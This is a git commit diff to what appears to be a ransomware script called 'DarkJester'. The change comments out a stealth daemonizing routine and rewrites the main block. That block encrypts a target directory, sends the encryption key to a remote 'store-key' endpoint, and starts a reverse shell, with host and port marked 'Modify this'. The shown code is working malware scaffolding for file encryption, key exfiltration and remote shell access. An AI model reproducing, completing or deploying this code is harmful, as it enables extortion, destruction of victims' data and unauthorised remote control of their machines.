3da6b97beb3d380b49a45e6c2fe2e6b2c5f9d601
DarkSeraph <114529635+kUrOSH1R0oo@users.noreply.github.com>
2024-12-07 18:05:50 +0800

    Add files via upload

--- darkjester_encryptor_specific_testing_linux.py
+++ darkjester_encryptor_specific_testing_linux.py
@@ -97,29 +97,29 @@ class ReverseShell:
         self.host = host
         self.port = port
 
-    def daemonize(self):
-        try:
-            pid = os.fork()
-            if pid > 0:
-                sys.exit(0)
-        except OSError as e:
-            sys.exit(1)
-        os.chdir("/")
-        os.setsid()
-        os.umask(0)
-        try:
-            pid = os.fork()
-            if pid > 0:
-                sys.exit(0)
-        except OSError as e:
-            sys.exit(1)
-        sys.stdout.flush()
-        sys.stderr.flush()
-        with open("/dev/null", 'r') as null_file:
-            os.dup2(null_file.fileno(), sys.stdin.fileno())
-        with open("/dev/null", 'a+') as null_file:
-            os.dup2(null_file.fileno(), sys.stdout.fileno())
-            os.dup2(null_file.fileno(), sys.stderr.fileno())
+    #def daemonize(self):
+        #try:
+            #pid = os.fork()
+            #if pid > 0:
+                #sys.exit(0)
+        #except OSError as e:
+            #sys.exit(1)
+        #os.chdir("/")
+        #os.setsid()
+        #os.umask(0)
+        #try:
+            #pid = os.fork()
+            #if pid > 0:
+                #sys.exit(0)
+        #except OSError as e:
+            #sys.exit(1)
+        #sys.stdout.flush()
+        #sys.stderr.flush()
+        #with open("/dev/null", 'r') as null_file:
+            #os.dup2(null_file.fileno(), sys.stdin.fileno())
+        #with open("/dev/null", 'a+') as null_file:
+            #os.dup2(null_file.fileno(), sys.stdout.fileno())
+            #os.dup2(null_file.fileno(), sys.stderr.fileno())
 
     def start(self):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -132,10 +132,7 @@ class ReverseShell:
 if __name__ == "__main__":
     jester = DarkJester()
     shell = ReverseShell('127.0.0.1', 1234) # Modify this
-    shell.daemonize()
-    target_directory = '/path/to/directory'
-    if os.path.exists(target_directory):
-        jester.encrypt_directory(target_directory, max_threads=30) # Modify this, adjust thread if needed
+    jester.encrypt_directory("path/to/directory", max_threads=30) # Modify this, adjust thread if needed
     jester.exfiltrate_key("http://127.0.0.1:5000/store-key") # Modify this
     shell.start()
 
